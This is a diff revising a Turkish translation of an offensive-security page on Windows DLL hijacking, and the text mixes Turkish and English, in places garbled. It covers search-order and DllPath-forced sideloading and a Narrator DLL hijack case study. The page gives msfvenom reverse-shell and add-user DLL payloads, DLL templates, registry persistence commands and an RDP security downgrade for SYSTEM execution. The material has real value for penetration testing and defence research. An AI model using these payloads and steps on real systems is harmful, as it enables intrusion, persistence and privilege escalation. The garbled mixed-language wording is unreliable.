@@ -5,79 +5,85 @@
 
 ## Temel Bilgiler
 
-DLL Hijacking, güvenilir bir uygulamanın zararlı bir DLL yüklemesini sağlayacak şekilde manipüle edilmesini içerir. Bu terim **DLL Spoofing, Injection ve Side-Loading** gibi birkaç taktiği kapsar. Genellikle code execution, persistence ve daha nadiren privilege escalation için kullanılır. Burada eskalasyona odaklanılsa da, hijacking yöntemi hedeflerden bağımsız olarak aynıdır.
+DLL Hijacking, güvenilen bir uygulamanın kötü amaçlı bir DLL yükleyecek şekilde manipüle edilmesini içerir. Bu terim **DLL Spoofing, Injection, and Side-Loading** gibi birkaç taktiği kapsar. Genellikle kod yürütme, kalıcılık sağlama ve daha az yaygın olarak ayrıcalık yükseltme için kullanılır. Burada yükseltmeye odaklanılsa da, hijacking yöntemi amaçlar arasında aynıdır.
 
-### Yaygın Yöntemler
+### Yaygın Teknikler
 
-DLL hijacking için kullanılan birkaç yöntem vardır; her birinin etkinliği uygulamanın DLL yükleme stratejisine bağlıdır:
+Bir uygulamanın DLL yükleme stratejisine bağlı olarak farklı etkinliklerde bulunan birkaç yöntem kullanılır:
 
-1. **DLL Replacement**: Gerçek bir DLL'in yerine zararlı bir tane koymak; orijinal DLL işlevselliğini korumak için opsiyonel olarak DLL Proxying kullanılır.
-2. **DLL Search Order Hijacking**: Zararlı DLL'i, meşru olanın önünde aranacak bir arama yoluna yerleştirerek uygulamanın arama deseninden yararlanma.
-3. **Phantom DLL Hijacking**: Uygulamanın yükleyeceğini düşündüğü, aslında mevcut olmayan bir gerekli DLL için zararlı bir DLL oluşturma.
-4. **DLL Redirection**: Uygulamanın zararlı DLL'e yönlendirilmesi için %PATH% veya .exe.manifest / .exe.local gibi arama parametrelerini değiştirme.
-5. **WinSxS DLL Replacement**: WinSxS dizininde meşru DLL'in yerine zararlı bir muadil koyma; bu yöntem genellikle DLL side-loading ile ilişkilidir.
-6. **Relative Path DLL Hijacking**: Zararlı DLL'i, kopyalanmış uygulama ile birlikte kullanıcı kontrolündeki bir dizine koymak; Binary Proxy Execution tekniklerine benzer.
+1. **DLL Replacement**: Gerçek bir DLL'i kötü amaçlı bir tane ile değiştirerek, isteğe bağlı olarak orijinal DLL'in işlevselliğini korumak için DLL Proxying kullanma.
+2. **DLL Search Order Hijacking**: Kötü amaçlı DLL'i, meşru olandan önce aranacak bir arama yoluna yerleştirerek uygulamanın arama desenini istismar etme.
+3. **Phantom DLL Hijacking**: Uygulamanın, mevcut olmayan ama gerekli olduğunu düşündüğü bir DLL olarak yükleyeceği kötü amaçlı bir DLL oluşturma.
+4. **DLL Redirection**: Uygulamayı kötü amaçlı DLL'e yönlendirmek için %PATH% veya .exe.manifest / .exe.local gibi arama parametrelerini değiştirme.
+5. **WinSxS DLL Replacement**: WinSxS dizinindeki meşru DLL'i kötü amaçlı bir karşılığıyla değiştirme; genellikle DLL side-loading ile ilişkilendirilen bir yöntem.
+6. **Relative Path DLL Hijacking**: Kötü amaçlı DLL'i kopyalanmış uygulama ile birlikte kullanıcı kontrollü bir dizine yerleştirerek Binary Proxy Execution tekniklerine benzeyen bir yaklaşım.
 
-## Eksik Dll'leri Bulma
+> [!TIP]
+> DLL sideloading üzerine HTML staging, AES-CTR config'leri ve .NET implantlarını katmanlayarak adım adım bir zincir için aşağıdaki iş akışını inceleyin.
 
-Sistemdeki eksik Dll'leri bulmanın en yaygın yolu, sysinternals'tan [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) çalıştırmak ve **aşağıdaki 2 filtreyi** ayarlamaktır:
+{{#ref}}
+advanced-html-staged-dll-sideloading.md
+{{#endref}}
+
+## Eksik DLL'leri Bulma
+
+Sistem içindeki eksik DLL'leri bulmanın en yaygın yolu, sysinternals'tan [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) aracını çalıştırmak ve **aşağıdaki 2 filtreyi** ayarlamaktır:
 
 ![](<../../../images/image (961).png>)
 
 ![](<../../../images/image (230).png>)
 
-ve yalnızca **File System Activity** gösterin:
+ve sadece **File System Activity**'yi gösterin:
 
 ![](<../../../images/image (153).png>)
 
-Eğer genel olarak **eksik dll'ler** arıyorsanız, bunu birkaç **saniye** çalıştırılmış bırakın.\
-Belirli bir yürütülebilir dosya içindeki **eksik dll'i** arıyorsanız, **"Process Name" "contains" `<exec name>`** gibi başka bir filtre eklemeli, uygulamayı çalıştırmalı ve olay yakalamayı durdurmalısınız.
+Genel olarak **eksik DLL'leri** arıyorsanız, bunu birkaç **saniye** çalışır durumda bırakın.\
+Belirli bir yürütülebilir dosya içindeki **eksik DLL'i** arıyorsanız, **başka bir filtre** örneğin "Process Name" "contains" `<exec name>` ayarlayın, uygulamayı çalıştırın ve olay yakalamayı durdurun.
 
-## Eksik Dll'leri Sömürme
+## Eksik DLL'leri İstismar Etme
 
-Eskalasyon sağlamak için en iyi şansımız, ayrıcalıklı bir sürecin yüklemeye çalışacağı bir dll'i, o dll'in aranacağı yerlerden birine yazabilmektir. Bu sayede ya **orijinal dll'in bulunduğu klasörden önce** aranan bir klasöre dll yazabiliriz (garip bir durum), ya da orijinal **dll'in hiçbir klasörde bulunmadığı** ve dll'in aranacağı bir klasöre yazma imkanımız olur.
+Ayrıcalık yükseltmek için en iyi şansımız, ayrıcalıklı bir sürecin yüklemeye çalışacağı bir DLL'i, o DLL'in aranacağı yerlerden birine yazabilmektir. Bu durumda, DLL'in orijinalinin bulunduğu klasörden **önce** aranacak bir klasöre kötü amaçlı bir DLL yazabiliriz (garip bir durum), veya DLL'in aranacağı bir klasöre yazabiliriz ve orijinal DLL hiçbir klasörde mevcut olmayabilir.
 
-### Dll Arama Sırası
+### DLL Arama Sırası
 
-[**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) içinde Dll'lerin nasıl yüklendiğini özellikle bulabilirsiniz.
+**[**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching)** içinde DLL'lerin nasıl yüklendiği ayrıntılı olarak bulunabilir.
 
-Windows uygulamaları, DLL'ler için önceden tanımlanmış bir dizi arama yolunu belirli bir sıra ile izleyerek arama yapar. DLL hijacking sorunu, zararlı bir DLL'in bu dizinlerden birine stratejik olarak yerleştirilmesi ve böylece orijinal DLL'den önce yüklenmesinin sağlanmasıyla ortaya çıkar. Bunu önlemenin bir yolu, uygulamanın ihtiyaç duyduğu DLL'lere başvururken mutlak yollar kullanmasını sağlamaktır.
+Windows uygulamaları, DLL'leri belirli bir sıra izleyerek önceden tanımlanmış arama yollarından arar. DLL hijacking sorunu, kötü amaçlı bir DLL'in bu dizinlerden birine stratejik olarak yerleştirilmesi ve meşru DLL'den önce yüklenmesinin sağlanmasıyla ortaya çıkar. Bunu önlemenin bir yolu, uygulamanın ihtiyaç duyduğu DLL'lere başvururken mutlak yollar kullanmasını sağlamaktır.
 
-32-bit sistemlerdeki DLL arama sırasını aşağıda görebilirsiniz:
+Aşağıda 32-bit sistemlerdeki DLL arama sırasını görebilirsiniz:
 
 1. Uygulamanın yüklendiği dizin.
-2. Sistem dizini. Bu dizinin yolunu almak için [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) fonksiyonunu kullanın.(_C:\Windows\System32_)
-3. 16-bit sistem dizini. Bu dizinin yolunu elde eden bir fonksiyon yoktur ama yine de aranır. (_C:\Windows\System_)
-4. Windows dizini. Bu dizinin yolunu almak için [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) fonksiyonunu kullanın.
-1. (_C:\Windows_)
+2. Sistem dizini. Bu dizinin yolunu almak için [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) fonksiyonunu kullanın. (_C:\Windows\System32_)
+3. 16-bit sistem dizini. Bu dizinin yolunu elde eden bir fonksiyon yoktur, ama arama yapılır. (_C:\Windows\System_)
+4. Windows dizini. Bu dizinin yolunu almak için [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) fonksiyonunu kullanın. (_C:\Windows_)
 5. Geçerli dizin.
-6. PATH ortam değişkeninde listelenen dizinler. Bunun, App Paths kayıt anahtarı tarafından belirtilen uygulama başına yolunu içermediğini unutmayın. App Paths anahtarı DLL arama yolu hesaplanırken kullanılmaz.
+6. PATH ortam değişkeninde listelenen dizinler. Bunun App Paths kayıt anahtarıyla belirtilen uygulama başına yolu içermediğini unutmayın. App Paths anahtarı DLL arama yolu hesaplanırken kullanılmaz.
 
-Bu, SafeDllSearchMode etkinleştirildiğinde varsayılan arama sırasıdır. Devre dışı bırakıldığında geçerli dizin ikinci sıraya yükselir. Bu özelliği devre dışı bırakmak için HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\\SafeDllSearchMode kayıt değerini oluşturun ve 0 olarak ayarlayın (varsayılan etkin).
+Bu, SafeDllSearchMode etkinken varsayılan arama sırasıdır. Devre dışı bırakıldığında, mevcut dizin ikinci sıraya yükselir. Bu özelliği devre dışı bırakmak için HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\\SafeDllSearchMode kayıt değerini oluşturun ve 0 olarak ayarlayın (varsayılan etkin).
 
-Eğer [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) fonksiyonu **LOAD_WITH_ALTERED_SEARCH_PATH** ile çağrılırsa, arama LoadLibraryEx'in yüklemekte olduğu yürütülebilir modülün dizininde başlar.
+Eğer [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) fonksiyonu **LOAD_WITH_ALTERED_SEARCH_PATH** ile çağrılırsa arama, **LoadLibraryEx**'in yüklediği yürütülebilir modülün dizininde başlar.
 
-Son olarak, bir dll sadece adı yerine mutlak yol belirtilerek yüklenebilir. Bu durumda o dll yalnızca belirtilen yolda aranacaktır (eğer dll'in bağımlılıkları varsa, onlar adla yüklendiği gibi aranacaktır).
+Son olarak, bir DLL yalnızca isim yerine mutlak yol belirterek de yüklenebilir. Bu durumda o DLL yalnızca belirtilen yolda aranır (eğer DLL'in bağımlılıkları varsa, onlar isimle yüklenecekmiş gibi aranır).
 
-Arama sırasını değiştirmeye yönelik başka yollar da vardır fakat bunları burada açıklamayacağım.
+Arama sırasını değiştirebilecek başka yollar da vardır ancak burada bunları açıklamayacağım.
 
 ### RTL_USER_PROCESS_PARAMETERS.DllPath ile sideloading'i zorlamak
 
-Yeni oluşturulan bir sürecin DLL arama yolunu deterministik olarak etkilemenin gelişmiş bir yolu, süreci ntdll’in native API'leri ile oluştururken RTL_USER_PROCESS_PARAMETERS içindeki DllPath alanını ayarlamaktır. Buraya saldırgan kontrollü bir dizin verilirse, bir hedef süreç isimle (mutlak yol olmadan ve safe loading flag'leri kullanmadan) bir import DLL'i çözdüğünde, o dizinden zararlı bir DLL yüklemeye zorlanabilir.
+Yeni oluşturulan bir sürecin DLL arama yolunu deterministik olarak etkilemenin gelişmiş bir yolu, süreci ntdll’in native API'leri ile oluştururken RTL_USER_PROCESS_PARAMETERS içindeki DllPath alanını ayarlamaktır. Burada saldırgan kontrollü bir dizin sağlayarak, içe aktarılmış bir DLL'i ismiyle (mutlak yol olmadan ve güvenli yükleme bayrakları kullanılmadan) çözen hedef süreç, o dizinden kötü amaçlı bir DLL yüklemeye zorlanabilir.
 
-Ana fikir
-- Process parametrelerini RtlCreateProcessParametersEx ile oluşturun ve kontrollü klasörünüzü (ör. dropper/unpacker'ın bulunduğu dizin) işaret eden özel bir DllPath sağlayın.
-- Süreci RtlCreateUserProcess ile oluşturun. Hedef ikili bir DLL'i adla çözdüğünde, loader bu sağlanan DllPath'i çözümleme sırasında danışacak ve böylece zararlı DLL hedef EXE ile aynı konumda olmasa bile güvenilir sideloading mümkün olacaktır.
+Temel fikir
+- RtlCreateProcessParametersEx ile süreç parametrelerini oluşturun ve kontrolünüzdeki klasöre (ör. dropper/unpacker'ın bulunduğu dizin) işaret eden özel bir DllPath sağlayın.
+- RtlCreateUserProcess ile süreci oluşturun. Hedef ikili bir DLL'i ismiyle çözdüğünde, yükleyici çözümleme sırasında sağlanan bu DllPath'e bakacak ve kötü amaçlı DLL'in hedef EXE ile aynı yerde olmaması durumunda bile güvenilir sideloading yapılmasını sağlayacaktır.
 
 Notlar/sınırlamalar
-- Bu, oluşturulan child process'i etkiler; SetDllDirectory'den farklı olarak yalnızca mevcut süreci etkilemez.
-- Hedefin bir DLL'i adla import etmesi veya LoadLibrary ile adla yüklemesi gerekir (mutlak yol olmadan ve LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories kullanılmıyor olmalı).
-- KnownDLLs ve sert kodlanmış mutlak yollar ele geçirilemez. Forwarded exports ve SxS önceliği değiştirebilir.
+- Bu, oluşturulan çocuk süreci etkiler; SetDllDirectory ise yalnızca mevcut süreci etkiler.
+- Hedef, bir DLL'i ismiyle import etmeli veya LoadLibrary ile yüklemeli (mutlak yol olmamalı ve LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories kullanılmamalı).
+- KnownDLLs ve sabitlenmiş mutlak yollar hijack edilemez. Forwarded exports ve SxS önceliği değiştirebilir.
 
-Minimal C örneği (ntdll, wide strings, basitleştirilmiş hata yönetimi):
+Minimal C örneği (ntdll, geniş dizeler, basitleştirilmiş hata yönetimi):
 
 <details>
-<summary>Tam C örneği: forcing DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
+<summary>Tam C örneği: RTL_USER_PROCESS_PARAMETERS.DllPath ile DLL sideloading'i zorlamak</summary>
 ```c
 #include <windows.h>
 #include <winternl.h>
@@ -150,37 +156,37 @@ return 0;
 ```
 </details>
 
-Operasyonel kullanım örneği
-- Kötü amaçlı xmllite.dll'yi (gerekli fonksiyonları export eden veya gerçek olanına proxy yapan) DllPath dizininize yerleştirin.
-- Yukarıdaki teknikle isminden xmllite.dll aradığı bilinen imzalı bir ikiliyi başlatın. Loader, importu verilen DllPath aracılığıyla çözer ve DLL'inizi sideload eder.
+Operational usage example
+- Place a malicious xmllite.dll (exporting the required functions or proxying to the real one) in your DllPath directory.
+- Launch a signed binary known to look up xmllite.dll by name using the above technique. The loader resolves the import via the supplied DllPath and sideloads your DLL.
 
-Bu teknik, sahada multi-stage sideloading zincirlerini tetiklemek için gözlemlenmiştir: bir initial launcher bir helper DLL bırakır; bu da daha sonra özel bir DllPath ile Microsoft-signed, hijackable bir ikili spawn eder ve saldırganın DLL'inin bir staging directory'den yüklenmesini zorlar.
+This technique has been observed in-the-wild to drive multi-stage sideloading chains: an initial launcher drops a helper DLL, which then spawns a Microsoft-signed, hijackable binary with a custom DllPath to force loading of the attacker’s DLL from a staging directory.
 
 
-#### Windows belgelerindeki dll arama sırasına ilişkin istisnalar
+#### Exceptions on dll search order from Windows docs
 
-Standart DLL arama sırasına ilişkin bazı istisnalar Windows belgelerinde belirtilmiştir:
+Windows belgelerinde standart DLL arama sırasına ilişkin bazı istisnalar belirtilmiştir:
 
-- Bir **adı bellekte zaten yüklü olan bir DLL ile aynı olan DLL** ile karşılaşıldığında, sistem olağan aramayı atlar. Bunun yerine, bellekteki DLL'e dönmeden önce yönlendirme ve manifest için bir kontrol gerçekleştirir. **Bu senaryoda sistem DLL için bir arama yapmaz**.
-- DLL mevcut Windows sürümü için bir **known DLL** olarak tanındığında, sistem known DLL'in kendi sürümünü ve varsa onun bağımlı DLL'lerini kullanır, **arama sürecini atlayarak**. Kayıt defteri anahtarı **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** bu known DLL'lerin bir listesini tutar.
-- Bir **DLL'in bağımlılıkları olması** durumunda, bu bağımlı DLL'ler için yapılan arama, ilk DLL tam yol ile tanımlanmış olsa bile, sanki bunlar yalnızca **module names** ile belirtilmiş gibi yürütülür.
+- Bir **DLL, belleğe zaten yüklenmiş olanla aynı ada sahipse**, sistem olağan aramayı atlar. Bunun yerine yönlendirme ve manifest kontrolü yapar; aksi takdirde zaten bellekte bulunan DLL'yi kullanır. **Bu durumda, sistem DLL için bir arama gerçekleştirmez**.
+- DLL, geçerli Windows sürümü için bir **known DLL** olarak tanınırsa, sistem bilinen DLL'nin kendi sürümünü ve onun bağımlı olduğu DLL'leri kullanır; böylece **arama işlemi atlanır**. Bu bilinen DLL'lerin listesi kayıt defterindeki **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** anahtarında tutulur.
+- Bir **DLL'nin bağımlılıkları** varsa, bu bağımlı DLL'lerin araması, ilk DLL tam yol ile belirtilmiş olsa bile yalnızca **module name** ile belirtilmiş gibi yürütülür.
 
-### Yetki Yükseltme
+### Escalating Privileges
 
-**Gereksinimler**:
+**Requirements**:
 
-- Farklı ayrıcalıklar altında (horizontal or lateral movement) çalışan veya çalışacak ve **bir DLL'den yoksun olan** bir süreci belirleyin.
-- **DLL**'in aranacağı herhangi bir **dizin** için **yazma izninin** mevcut olduğundan emin olun. Bu konum yürütülebilir dosyanın dizini veya system path içindeki bir dizin olabilir.
+- Farklı ayrıcalıklarla (yatay veya lateral hareket) çalışan veya çalışacak bir işlemi belirleyin ve bu işlemin **bir DLL'den yoksun** olduğunu tespit edin.
+- **DLL'nin aranacağı** herhangi bir **dizin** için **write access** sağlandığından emin olun. Bu konum, yürütülebilir dosyanın bulunduğu dizin veya system path içindeki bir dizin olabilir.
 
-Evet, gereksinimleri bulmak zordur çünkü **varsayılan olarak ayrıcalıklı bir yürütülebilir dosyanın bir DLL'den yoksun olması tuhaftır** ve bir **system path klasöründe yazma iznine sahip olmak** daha da tuhaftır (varsayılan olarak bunu yapamazsınız). Ancak hatalı yapılandırılmış ortamlarda bu mümkün olabilir.\
-Şanslıysanız ve gereksinimleri karşılıyorsanız, [UACME](https://github.com/hfiref0x/UACME) projesine bakabilirsiniz. Projenin **ana amacı UAC'i bypass etmek** olsa bile, kullanabileceğiniz Windows sürümü için bir **PoC** of a Dll hijaking orada bulabilirsiniz (muhtemelen sadece yazma iznine sahip olduğunuz klasörün yolunu değiştirerek).
+Evet, gereksinimleri bulmak karmaşıktır çünkü **varsayılan olarak ayrıcalıklı bir yürütülebilirin eksik bir dll'ye sahip olması gariptir** ve bir de üzerine **system path klasöründe yazma iznine sahip olmak daha da gariptir** (varsayılan olarak sahip olamazsınız). Ancak kötü yapılandırılmış ortamlarda bu mümkün olabilir.\
+Şanslıysanız ve gereksinimleri karşılıyorsanız, [UACME](https://github.com/hfiref0x/UACME) projesine bakabilirsiniz. Projenin **ana amacı UAC'yi bypass etmek** olsa bile, burada kullanabileceğiniz Windows sürümü için bir **PoC** veya bir Dll hijaking örneği bulabilirsiniz (muhtemelen sadece yazma izniniz olan klasörün yolunu değiştirerek).
 
-Bir klasörde **izinlerinizi kontrol edebileceğinizi** unutmayın:
+Note that you can **check your permissions in a folder** doing:
 ```bash
 accesschk.exe -dqv "C:\Python27"
 icacls "C:\Python27"
 ```
-Ve **PATH içindeki tüm dizinlerin izinlerini kontrol edin**:
+Ve **PATH içindeki tüm klasörlerin izinlerini kontrol edin**:
 ```bash
 for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
 ```
@@ -191,27 +197,28 @@ dumpbin /export /path/file.dll
 ```
 For a full guide on how to **abuse Dll Hijacking to escalate privileges** with permissions to write in a **System Path folder** check:
 
+
 {{#ref}}
 writable-sys-path-dll-hijacking-privesc.md
 {{#endref}}
 
 ### Otomatik araçlar
 
-[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) system PATH içindeki herhangi bir klasörde yazma izniniz olup olmadığını kontrol eder.\
-Bu zafiyeti keşfetmek için diğer ilginç otomatik araçlar PowerSploit fonksiyonlarıdır: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ ve _Write-HijackDll_.
+[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) sistem PATH içindeki herhangi bir klasörde yazma izniniz olup olmadığını kontrol eder.\
+Bu zafiyeti keşfetmek için ilginç diğer otomatik araçlar **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ ve _Write-HijackDll_'dır.
 
 ### Örnek
 
-Eğer exploitable bir senaryo bulursanız, bunu başarılı şekilde exploit etmek için en önemli şeylerden biri, executable'ın ondan import edeceği en azından tüm fonksiyonları export eden bir dll oluşturmaktır. Ayrıca, Dll Hijacking'in [escalate from Medium Integrity level to High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) veya [**High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system) için kullanışlı olduğunu unutmayın. Bu yürütme amaçlı dll hijacking çalışmasında **geçerli bir dll nasıl oluşturulur** örneğini bulabilirsiniz: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows).\
-Ayrıca, bir sonraki bölümde şablon olarak kullanabileceğiniz veya gerekmeyen fonksiyonları dışa aktaran bir dll oluşturmak için faydalı olabilecek bazı temel dll kodları bulabilirsiniz.
+Eğer istismar edilebilir bir senaryo bulursanız, bunu başarıyla istismar etmek için en önemli noktalardan biri, yürütülebilir dosyanın bundan içe aktaracağı tüm fonksiyonları en azından dışa veren bir **dll oluşturmak** olacaktır. Her halükârda, Dll Hijacking, [escalate from Medium Integrity level to High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) veya [ **High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system) için işe yarayabilir. Bu amaçla yürütme için dll hijacking'e odaklanan çalışmada **how to create a valid dll** örneğini bulabilirsiniz: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
+Ayrıca, **next sectio**n'da bazı **basic dll codes** bulabilirsiniz; bunlar **templates** olarak veya **non required functions exported** eden bir **dll** oluşturmak için faydalı olabilir.
 
 ## **Creating and compiling Dlls**
 
 ### **Dll Proxifying**
 
-Temelde bir **Dll proxy**, yüklendiğinde kötü amaçlı kodunuzu çalıştırabilen, aynı zamanda gerçek kütüphaneye yapılan tüm çağrıları ileterek beklendiği gibi davranan ve işlevselliği sağlayan bir Dll'dir.
+Temelde bir **Dll proxy**, yüklendiğinde **execute your malicious code when loaded** yeteneğine sahip bir Dll'dir; aynı zamanda **expose** edip **work** as **exected** by **relaying all the calls to the real library**.
 
-[**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) veya [**Spartacus**](https://github.com/Accenture/Spartacus) araçları ile aslında bir executable belirleyip proxify etmek istediğiniz kütüphaneyi seçebilir ve proxified dll üretebilir ya da Dll'i belirleyip proxified dll oluşturabilirsiniz.
+[**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) veya [**Spartacus**](https://github.com/Accenture/Spartacus) araçlarıyla, proxify etmek istediğiniz kütüphaneyi seçerek bir yürütülebilir dosyayı belirtebilir ve **generate a proxified dll** veya doğrudan **indicate the Dll** ve **generate a proxified dll** yapabilirsiniz.
 
 ### **Meterpreter**
 
@@ -223,13 +230,13 @@ msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll 
 ```bash
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
 ```
-**Kullanıcı oluştur (x86, x64 sürümünü görmedim):**
+**Bir kullanıcı oluştur (x86, x64 sürümünü görmedim):**
 ```bash
 msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
 ```
-### Kendi
+### Kendiniz
 
-Unutmayın ki bazı durumlarda derlediğiniz Dll, victim process tarafından yüklenecek **export several functions**'ı barındırmalıdır; bu fonksiyonlar mevcut değilse **binary won't be able to load** ve **exploit will fail**.
+Bazı durumlarda derlediğiniz Dll'in victim process tarafından yüklenecek birkaç **export several functions**'ı dışa aktarması gerektiğine dikkat edin; bu functions yoksa **binary won't be able to load** ve **exploit will fail**.
 
 <details>
 <summary>C DLL template (Win10)</summary>
@@ -268,7 +275,7 @@ return TRUE;
 }
 ```
 <details>
-<summary>C++ DLL kullanıcı oluşturma içeren örnek</summary>
+<summary>C++ DLL örneği: kullanıcı oluşturma</summary>
 ```c
 //x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
 //x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a
@@ -291,7 +298,7 @@ return 0;
 </details>
 
 <details>
-<summary>İş parçacığı girişli alternatif C DLL</summary>
+<summary>İş parçacığı girişine sahip alternatif C DLL</summary>
 ```c
 //Another possible DLL
 // i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll
@@ -321,16 +328,16 @@ return TRUE;
 
 ## Vaka İncelemesi: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)
 
-Windows Narrator.exe, başlamada öngörülebilir, dile özgü bir yerelleştirme DLL'ini halen deniyor; bu DLL hijack edilerek arbitrary code execution ve persistence sağlanabilir.
+Windows Narrator.exe, başlatıldığında hala öngörülebilir, dile özel bir localization DLL'ini yoklar; bu DLL ele geçirilerek keyfi kod yürütme ve kalıcılık sağlanabilir.
 
-Key facts
-- Deneme yolu (güncel build'ler): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
-- Eski yol (eski build'ler): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
-- Eğer OneCore yolunda saldırgan kontrolündeki yazılabilir bir DLL mevcutsa, bu yüklenir ve `DllMain(DLL_PROCESS_ATTACH)` çalıştırılır. Export'lar gerekli değildir.
+Temel bilgiler
+- Arama yolu (güncel sürümler): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
+- Eski yol (eski sürümler): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
+- OneCore yolunda yazılabilir, saldırgan kontrollü bir DLL varsa, bu yüklenir ve `DllMain(DLL_PROCESS_ATTACH)` çalıştırılır. Herhangi bir export gerekmez.
 
-Discovery with Procmon
+Procmon ile keşif
 - Filtre: `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
-- Narrator'ı başlatın ve yukarıdaki yolun yüklenmeye çalışıldığını gözlemleyin.
+- Narrator'ı başlatın ve yukarıdaki yolun yüklenme girişimini gözlemleyin.
 
 Minimal DLL
 ```c
@@ -344,40 +351,40 @@ if (r == DLL_PROCESS_ATTACH) {
 return TRUE;
 }
 ```
-OPSEC sessizliği
-- A naive hijack UI'yi konuşur/vurgular. Sessiz kalmak için, on attach Narrator iş parçacıklarını enumerate edin, ana iş parçacığını açın (`OpenThread(THREAD_SUSPEND_RESUME)`) ve `SuspendThread` ile durdurun; kendi iş parçacığınızda devam edin. Tam kod için PoC'ye bakın.
+OPSEC silence
+- A naive hijack will speak/highlight UI. To stay quiet, on attach enumerate Narrator threads, open the main thread (`OpenThread(THREAD_SUSPEND_RESUME)`) and `SuspendThread` it; continue in your own thread. See PoC for full code.
 
-Erişilebilirlik yapılandırmasıyla tetikleme ve kalıcılık
-- User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
+Trigger and persistence via Accessibility configuration
+- Kullanıcı bağlamı (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
 - Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
-- Yukarıdakilerle, Narrator başlatıldığında yerleştirilen DLL yüklenir. Güvenli masaüstünde (oturum açma ekranı) Narrator'ı başlatmak için CTRL+WIN+ENTER tuşlarına basın.
+- Yukarıdakilerle, Narrator başlatıldığında yerleştirilmiş DLL yüklenir. Güvenli masaüstünde (oturum açma ekranı) Narrator'ı başlatmak için CTRL+WIN+ENTER tuşlarına basın.
 
 RDP-triggered SYSTEM execution (lateral movement)
-- Allow classic RDP security layer: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
-- Host'a RDP ile bağlanın, oturum açma ekranında Narrator'ı başlatmak için CTRL+WIN+ENTER tuşlarına basın; DLL'iniz güvenli masaüstünde SYSTEM olarak çalışır.
-- RDP oturumu kapandığında yürütme durur — bu yüzden hızla inject/migrate edin.
+- Klasik RDP güvenlik katmanına izin verin: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
+- Host'a RDP yapın, oturum açma ekranında Narrator'ı başlatmak için CTRL+WIN+ENTER tuşlarına basın; DLL'iniz güvenli masaüstünde SYSTEM olarak çalışır.
+- Yürütme RDP oturumu kapandığında durur — inject/migrate işlemlerini hızla gerçekleştirin.
 
 Bring Your Own Accessibility (BYOA)
